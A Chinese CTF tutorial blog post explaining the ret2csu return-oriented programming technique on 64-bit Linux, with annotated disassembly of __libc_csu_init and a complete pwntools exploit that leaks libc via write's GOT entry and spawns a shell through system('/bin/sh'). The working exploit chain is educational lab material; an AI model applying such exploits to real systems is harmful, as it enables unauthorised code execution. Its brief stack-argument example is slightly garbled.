---
title: 中级ROP-ret2_libc_csu_init
date: 2026-09-08 01:52:46
categories: PWN
---

首先，我们需要了解一下64位文件的传参方式：
- 当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9
- 当参数为7个及以上时，前6个还是上面的寄存器，但多于6位的参数从右到左依次入栈，同32位
```
H(a, b, c, d, e, f, g, h)
a -> %rdi, b -> %rsi, c -> %rdx, d -> %rcx, e -> %r8, f -> %r9
h -> [esp]
g -> [esp]
call H
```

## 原理

在64位程序中，函数的前6个参数是通过寄存器传递的，但是在大多数时候，我们很难找到每一个寄存器对应的gadgets。这时候，我们可以利用x64下的_libc_csu_init中的gadgets。<mark style="background: #FF5582A6;">这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在</mark>  
我们来分析一下这个函数：  
{% asset_img code1.png %}  
可以发现从0x40061A一直到函数的结尾，我们都可以使用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器中的数据，也就是以下汇编代码：
```
.text:000000000040061A 030 5B                            pop     rbx
.text:000000000040061B 028 5D                            pop     rbp
.text:000000000040061C 020 41 5C                         pop     r12
.text:000000000040061E 018 41 5D                         pop     r13
.text:0000000000400620 010 41 5E                         pop     r14
.text:0000000000400622 008 41 5F                         pop     r15
.text:0000000000400624 000 C3                            retn
.text:0000000000400624                                   ; } // starts at 4005C0
.text:0000000000400624
.text:0000000000400624                                   __libc_csu_init endp
```
地址0x400600到0x400609，这里r13赋给rdx，r14赋给rsi，r15d赋给edi（因为是r15d，所以仅能控制rdi的低32位），而这三个寄存器，正是x64函数调用中传递的前三个寄存器（edi,rsi,rdx）。若我们可以合理控制r12与rbx，那么我们就可以调用我们想要调用的函数。汇编如下：
```
.text:0000000000400600                                   loc_400600:                            ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600 038 4C 89 EA                      mov     rdx, r13
.text:0000000000400603 038 4C 89 F6                      mov     rsi, r14
.text:0000000000400606 038 44 89 FF                      mov     edi, r15d
.text:0000000000400609 038 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
```
地址0x40060D到0x400614，我们可以通过控制rbx与rbp之间关系为rbx + 1 = rbp，使得cmp的值为0，从而不出发jnz跳转，不执行loc_400600，进而执行下面的汇编程序，汇编如下：
```
.text:000000000040060D 038 48 83 C3 01                   add     rbx, 1
.text:0000000000400611 038 48 39 EB                      cmp     rbx, rbp
.text:0000000000400614 038 75 EA                         jnz     short loc_400600
```

## 例题

查看文件基本信息和保护信息  
{% asset_img PixPin_2026-09-08_02-47-33.png %}  
ida静态分析，main函数中的vulnerable_function函数内存在read栈溢出，溢出字节数为136  
{% asset_img PixPin_2026-09-08_02-56-25.png %}  
可以发现，这个程序中并没有system函数，也没有/bin/sh字符串，但是有一个已知的write函数，我们便可以利用这个函数泄露libc的基地址
```python
payload = b'a' * 136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b'a'*(0x8 + 8 * 6) +p64(main_addr)
```
分析payload构造：  
首先填充136字节发生栈溢出，接着用pop_addr覆盖返回地址，使程序从0x40061A继续执行。即接下来会将我们payload中的<mark style="background: #FF5582A6;">0、1、write_got、8、write_got、1这六个值依次pop到rbx、rbp、r12、r13、r14、r15</mark>寄存器中，为什么是这六个值后面再分析。接着ret接收payload接下来的mov_addr，跳转到0x400600继续执行。这里程序会将r13赋给rdx(8)、r14赋给rsi(write_got)、r15d赋给edi(1)，接下来<mark style="background: #FF5582A6;">执行call调用，也就是说这里的三个赋值实际上是为接下来的call调用传参</mark>，call调用的函数地址为r12 + rbx * 8，由于我们上面pop寄存器的控制，call调用就是write函数（payload中只使用write_got而不用PLT表的原因是write函数在我们进行栈溢出之前就已经调用了，因此真实地址已经写入了GOT表中），而write函数接收上面三个参数，实际调用化为c语言便是`write(1, write_got, 8)`，即为<mark style="background: #FF5582A6;">向stdout输出地址为write_got的8个字节</mark>（write函数的真实地址），如此我们便做到了泄露write函数的真实地址。接下去便是<mark style="background: #FF5582A6;">回到main函数中以便我们第二次进行栈溢出，进行后续的ret2libc攻击</mark>。回到cpu执行，我们在执行了call调用后，先对rbx + 1，接着rbx与rbp比较，由于我们的控制，这里0 + 1 = 1，所以jnz不满足条件继续执行后续代码，也就是loc_400616。我们接下来的目的就只有回到main函数了，所以我们<mark style="background: #FF5582A6;">直接填充(0x8 + 8 * 6)字节，0x8是为了抵消`add esp, 8`，而8 * 6则是抵消6个pop，然后ret接收payload接下来的main_addr</mark>，将cpu跳转回main函数，以便我们继续进行ret2libc攻击
```python
from pwn import *  

context(arch = 'amd64', os = 'linux',log_level = 'debug') 

io = process('./pwn')
elf = ELF('./pwn')  

write_got = elf.got['write']
pop_addr = 0x40061A
mov_addr = 0x400600
main_addr = elf.symbols['main']

payload = b'a' * 136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b'a'*(0x8 + 8 * 6) +p64(main_addr)  

io.recvuntil('Hello, World\n')
io.sendline(payload)  

write_addr = u64(io.recv(8))
print('write_addr = ', hex(write_addr))
```
如此，我们便得到了write函数的真实地址
>[!info]  
>程序加载时会寻找同目录下的libc.so.6文件，如果存在，则会自动加载，而不会去加载系统自带的libc文件

通过题目所给出的libc.so.6文件可以计算出libc加载基址，从而可以算出system函数和/bin/sh的真实地址。<mark style="background: #FF5582A6;">由于我们现在是本地攻击的，因此用libc用的是系统的libc文件</mark>。接下来我们要做的就是利用main函数栈溢出执行system('/bin/sh')这个指令，而我们知道<mark style="background: #FF5582A6;">64位程序中system调用时，参数取的是rdi中的值</mark>，因此我们需要先将/bin/sh字符串pop给rdi才行，我们这里利用ROPgadget直接查
```python
$ ROPgadget --binary ./pwn | grep "pop rdi ; ret"
0x0000000000400623 : pop rdi ; ret
```
通过payload链中pop rdi后紧跟/bin/sh，将/bin/sh字符串pop给rdi，并且通过ret接着执行其他命令，我们这个时候再调用system函数即可，结果即为`system('/bin/sh')`，完整exp如下：
```python
from pwn import *

context(arch = 'amd64', os = 'linux',log_level = 'debug')

io = process('./pwn')
elf = ELF('./pwn')  
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc.so.6') 打远程用这个

write_got = elf.got['write']
pop_addr = 0x40061A
mov_addr = 0x400600
main_addr = elf.symbols['main']

payload = b'a' * 136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b'a'*(0x8 + 8 * 6) +p64(main_addr)

io.recvuntil(b'Hello, World\n')
io.sendline(payload)

write_addr = u64(io.recv(8))
print('write_addr = ', hex(write_addr)) 

libc_base_addr = write_addr - libc.symbols['write']
system_addr = libc_base_addr + libc.symbols['system']
binsh_addr = libc_base_addr + next(libc.search(b'/bin/sh'))

print('libc_base_addr = ', hex(libc_base_addr))
print('system_addr = ', hex(system_addr))
print('binsh_addr = ', hex(binsh_addr))

pop_rdi_ret = 0x400623
ret_addr = 0x400419

payload = b'a' * 136 + p64(ret_addr) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)

io.sendline(payload)
io.interactive()
```
可以看到我这里加了一个ret做了一个对齐，具体原因就是<mark style="background: #FF5582A6;">在高版本Ubuntu中，system函数内部有movaps指令，要求调用时rsp % 16 == 0，强制我们16字节对齐</mark>，而我们的payload中136字节刚好是8的倍数，接着pop_rdi_ret又是8字节后进入了system函数，这时不再16字节对齐了，所以导致报错中断，因此我们这里通过<mark style="background: #FF5582A6;">添加一个ret补齐8字节的方式，使system函数调用前满足16字节对齐的条件</mark>

## 思考

但是还有一个问题，就是我们通过ROPgadget获取到的这个0x400623地址的`pop rdi ; ret`在IDA中并没有显示啊，这是为什么呢？  
我们不妨来看看_libc_csu_init这个函数末尾的pop处的机器码
```
.text:0000000000400616                                   loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400616 038 48 83 C4 08                   add     rsp, 8
.text:000000000040061A 030 5B                            pop     rbx
.text:000000000040061B 028 5D                            pop     rbp
.text:000000000040061C 020 41 5C                         pop     r12
.text:000000000040061E 018 41 5D                         pop     r13
.text:0000000000400620 010 41 5E                         pop     r14
.text:0000000000400622 008 41 5F                         pop     r15
.text:0000000000400624 000 C3                            retn
```
可以发现这里
```
pop rbx -> 5B
pop rbp -> 5D
pop r12 -> 41 5C
pop r13 -> 41 5D
pop r14 -> 41 5E
pop r15 -> 41 5F
```
很明显的，这里相邻机器码明显的规律，因此我们随便网上查一下就可以发现，pop rdi对应的机器码其实是5F  
0x400622 41 5F --> pop r15  
因此我们对其+1，就会变成0x400623 5F --> pop rdi  
也就是说gadgets其实是可以通过这种凑机器码的方式凑出我们想要的gadget的，我们可以利用ROPgadget求证一下  
{% asset_img PixPin_2026-09-11_03-39-12.png %}

## 拓展

***关于ROPgadget中--only和grep的区别***  
{% asset_img PixPin_2026-09-11_03-44-41.png %}  
--only是ROPgadget内部按指令类型过滤
- 参数为指令名列表，不支持带操作数的写法
- 多个指令之间使用 `|` 分隔
- 它把`"pop rdi ; ret"`整体当作一个指令名去做匹配，但实际指令名是`pop`和`ret`，所以无输出  
grep是外部按输出文本过滤
- 默认使用基础正则（BRE）来匹配，而 `|` 在BRE中只是普通字符，不是"或"
- 所以它在找字面量字符串`pop|ret`，而输出里根本没有`pop|ret`这个字符串，无输出
